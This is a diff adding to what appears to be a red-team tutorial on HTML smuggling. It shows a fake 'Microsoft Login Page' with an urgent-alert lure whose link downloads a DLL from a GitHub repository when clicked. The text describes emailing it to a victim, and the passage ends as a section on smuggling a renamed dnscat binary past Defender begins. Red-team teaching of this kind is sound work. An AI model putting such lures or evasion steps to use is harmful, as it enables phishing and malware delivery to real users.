@@ -58,3 +58,16 @@ Let’s break this down:
 If we save that and run it in a browser we will see the words Wassup Playa. 
 ## HTML5 Download Attribute
 One way that we can get a user to download something is using the download attribute from HTML5. For this I hosted an Atomic Red Team test dll called s.dll. The raw file can be found [here](https://github.com/sh1katagana1/RedTeam/raw/main/s.dll) So my HTML page that I would send to the victim could look like this (obviously this is not very pretty, just functional for testing)
+```
+<html>
+<body>
+<h1>Microsoft Login Page!</h1>
+<p>Alert! We detected some unusual activity, Login to continue. </p>
+<a href="https://github.com/sh1katagana1/RedTeam/raw/main/s.dll" download="https://github.com/sh1katagana1/RedTeam/raw/main/s.dll">Login Here</a>
+</body>
+</html>
+```
+If we load that page we should see the Microsoft Login Page! text and it should prompt for download of s.dll when you click "login to continue". You can see how it can be crafted in whatever way you want, but all that’s being emailed is the HTML that does this. Additionally, the victim may have their browser at default settings which wouldn’t give this prompt but just download it. 
+
+## Malicious Smuggle Test
+Now that we have seen benign usage of some ways to do HTML Smuggling, lets try with an actual binary. For this I am using a renamed version of dnscat because I know Defender blocks it as malicious. The dnscat executable I have renamed to leroy3.exe. 
